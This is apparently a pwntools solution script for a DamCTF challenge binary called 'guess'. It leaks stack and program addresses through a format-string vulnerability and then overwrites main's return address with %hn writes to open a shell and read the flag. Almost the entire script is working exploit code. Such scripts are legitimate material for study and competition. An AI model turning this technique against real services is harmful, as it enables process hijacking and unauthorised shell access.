#!/usr/bin/env python3

from pwn import *
import re
import sys

elf = context.binary = ELF('./guess')
libc = ELF('./libc.so.6')

host = args.HOST or 'chals.damctf.xyz'
port = int(args.PORT or 32766)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())


def write_chunk(print_length, chunk):
    extra = (chunk - print_length) % (1 << 16)
    if extra > 0:
        fmt_str = "%1$" + str(extra) + "c"
    else:
        fmt_str = ""
    return (print_length + extra, fmt_str)

p = start()
#gdb.attach(p)
p.recvuntil("tries.\n")

# Leak stuff

stack_leak_arg = 21
p.sendline(f"%16$p %{stack_leak_arg}$p")
leak = p.recvline().decode().split(' ')
program_leak = int(leak[0], 0)
stack_leak = int(leak[1], 0)
print(hex(program_leak), hex(stack_leak))
"""
p.sendline(100 * "%p ")
print(p.recv().decode())
p.interactive()
sys.exit()
"""
elf.address = program_leak - elf.sym['_start'];

# Overwrite return address to open shell.
#pop_shell_addr = elf.sym['main'] + 0x8e9 - 0x850
pop_shell_addr = elf.sym['main'] + 0x8f5 - 0x850

# The + 8 is due to environmental differences on the server
stack_leak_points_to_offset = 0x7ffd55ae7460 - 0x7ffd55ae7320 + 8

# 6 is the zeroth argument on stack (6 can be found with 100 * %p)
stack_leak_points_to_arg = 6 + stack_leak_points_to_offset // 8

main_rsp = stack_leak - stack_leak_points_to_offset

print_length = 0
format_str = ""

main_ret = main_rsp + 0x68
log.info('main_ret: {}'.format(hex(main_ret)))
(print_length, fmt) = write_chunk(print_length, main_ret)
format_str += fmt + f"%{stack_leak_arg}$hn"
log.info('fmt: {}'.format(format_str))
p.sendline(format_str)

for i in range(0, 8, 2):
    print_length = 0
    format_str = ""

    # printf uses a copy of its arguments when using $, so we have to setup the next write here.
    (print_length, fmt) = write_chunk(print_length, main_ret + i + 2)
    format_str += fmt + f"%{stack_leak_arg}$hn"
    (print_length, fmt) = write_chunk(print_length, pop_shell_addr >> 8*i)
    format_str += fmt + f"%{stack_leak_points_to_arg}$hn"
    log.info('fmt: {}'.format(format_str))
    p.recvuntil('was an incorrect guess\n')
    p.sendline(format_str)

for i in range(6, 10):
    p.recvuntil('was an incorrect guess\n')
    p.sendline("")

if len(sys.argv) == 2 and sys.argv[1] == "--test":
    p.sendline("cat flag")
    p.sendline("exit")
    if b"dam{" in p.recvall():
        sys.exit(0)
    else:
        sys.exit(1)
else:
    # Give shell to the user.
    p.interactive()
